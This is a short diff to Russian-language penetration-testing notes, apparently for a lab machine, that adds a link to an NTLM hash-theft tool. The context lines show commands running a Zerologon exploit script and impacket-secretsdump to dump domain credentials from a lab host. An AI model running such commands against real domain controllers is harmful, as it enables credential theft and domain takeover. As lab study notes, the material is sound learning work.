@@ -6,6 +6,11 @@ python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уяз
 
 impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
 
+# NTML atack
+
+---Создание ярлыков
+
+https://github.com/Greenwolf/ntlm_theft
 
 # Расшифровка учетных записей
 https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators
